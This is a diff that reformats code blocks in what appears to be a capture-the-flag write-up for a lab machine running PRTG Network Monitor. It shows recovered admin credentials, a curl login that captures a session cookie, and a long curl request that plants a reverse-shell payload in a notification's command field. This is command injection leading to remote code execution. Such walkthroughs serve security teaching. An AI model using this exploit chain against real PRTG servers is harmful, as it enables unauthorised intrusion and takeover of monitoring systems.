@@ -410,7 +410,7 @@ We find a few files.
 If we retrieve `PRTG Configuration.old.bak` and explore its content, we stumble
 across this:
 
-```
+```xml
 <SNIP>
 <dbpassword>
     <!-- User: prtgadmin -->
@@ -484,14 +484,14 @@ In order to create a notification, we need to be authenticated, so we need an
 
 ```sh
 ❯ RESPONSE=$(curl -s -i "http://10.10.10.152/public/checklogin.htm" -X "POST" --data-urlencode "username=prtgadmin" --data-urlencode "password=PrTg@dmin2019"); \
-    OCTOPUS1813713946=$(echo "$RESPONSE" | grep -i "Set-Cookie: OCTOPUS1813713946=" | awk -F '=' '{print $2}' | awk '{print $1}' | sed 's/;$//')
+  OCTOPUS1813713946=$(echo "$RESPONSE" | grep -i "Set-Cookie: OCTOPUS1813713946=" | awk -F '=' '{print $2}' | awk '{print $1}' | sed 's/;$//')
 ```
 
 Now we can create a notification with our payload. We'll save the ID of our notification.
 
 ```sh
 ❯ RESPONSE=$(curl -s -H "Cookie: OCTOPUS1813713946=$OCTOPUS1813713946" -H "X-Requested-With: XMLHttpRequest" "http://10.10.10.152/editsettings" -X POST --data-urlencode "name_=Revshell" --data-urlencode "tags_=" --data-urlencode "active_=1" --data-urlencode "schedule_=-1|None|" --data-urlencode "postpone_=1" --data-urlencode "comments=" --data-urlencode "summode_=2" --data-urlencode "summarysubject_=[%sitename] %summarycount Summarized Notifications" --data-urlencode "summinutes_=1" --data-urlencode "accessrights_=1" --data-urlencode "accessrights_=1" --data-urlencode "accessrights_201=0" --data-urlencode "active_1=0" --data-urlencode "addressuserid_1=-1" --data-urlencode "addressgroupid_1=-1" --data-urlencode "address_1=" --data-urlencode "subject_1=[%sitename] %device %name %status %down (%message)" --data-urlencode "contenttype_1=text/html" --data-urlencode "customtext_1=" --data-urlencode "priority_1=0" --data-urlencode "active_17=0" --data-urlencode "addressuserid_17=-1" --data-urlencode "addressgroupid_17=-1" --data-urlencode "message_17=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_8=0" --data-urlencode "addressuserid_8=-1" --data-urlencode "addressgroupid_8=-1" --data-urlencode "address_8=" --data-urlencode "message_8=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_2=0" --data-urlencode "eventlogfile_2=application" --data-urlencode "sender_2=PRTG Network Monitor" --data-urlencode "eventtype_2=error" --data-urlencode "message_2=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_13=0" --data-urlencode "sysloghost_13=" --data-urlencode "syslogport_13=514" --data-urlencode "syslogfacility_13=1" --data-urlencode "syslogencoding_13=1" --data-urlencode "message_13=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_14=0" --data-urlencode "snmphost_14=" --data-urlencode "snmpport_14=162" --data-urlencode "snmpcommunity_14=" --data-urlencode "snmptrapspec_14=0" --data-urlencode "messageid_14=0" --data-urlencode "message_14=[%sitename] %device %name %status %down (%message)" --data-urlencode "senderip_14=" --data-urlencode "active_9=0" --data-urlencode "url_9=" --data-urlencode "urlsniselect_9=0" --data-urlencode "urlsniname_9=" --data-urlencode "postdata_9=" --data-urlencode "active_10=0" --data-urlencode "active_10=10" --data-urlencode "address_10=Demo EXE Notification - OutFile.ps1" --data-urlencode "message_10=;$REVSHELL_PAYLOAD" --data-urlencode "windowslogindomain_10=" --data-urlencode "windowsloginusername_10=" --data-urlencode "windowsloginpassword_10=" --data-urlencode "timeout_10=60" --data-urlencode "active_15=0" --data-urlencode "accesskeyid_15=" --data-urlencode "secretaccesskeyid_15=" --data-urlencode "arn_15=" --data-urlencode "subject_15=" --data-urlencode "message_15=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_16=0" --data-urlencode "isusergroup_16=1" --data-urlencode "addressgroupid_16=200|PRTG Administrators" --data-urlencode "ticketuserid_16=100|PRTG System Administrator" --data-urlencode "subject_16=%device %name %status %down (%message)" --data-urlencode "message_16=Sensor: %name\nStatus: %status %down\n\nDate/Time: %datetime (%timezone)\nLast Result: %lastvalue\nLast Message: %message\n\nProbe: %probe\nGroup: %group\nDevice: %device (%host)\n\nLast Scan: %lastcheck\nLast Up: %lastup\nLast Down: %lastdown\nUptime: %uptime\nDowntime: %downtime\nCumulated since: %cumsince\nLocation: %location\n\n" --data-urlencode "autoclose_16=1" --data-urlencode "objecttype=notification" --data-urlencode "id=new"); \
-    ID=$(echo "$RESPONSE" | jq -r ".objid")
+  ID=$(echo "$RESPONSE" | jq -r ".objid")
 ```
 
 Finally, let's trigger the payload by sending a test notification request.
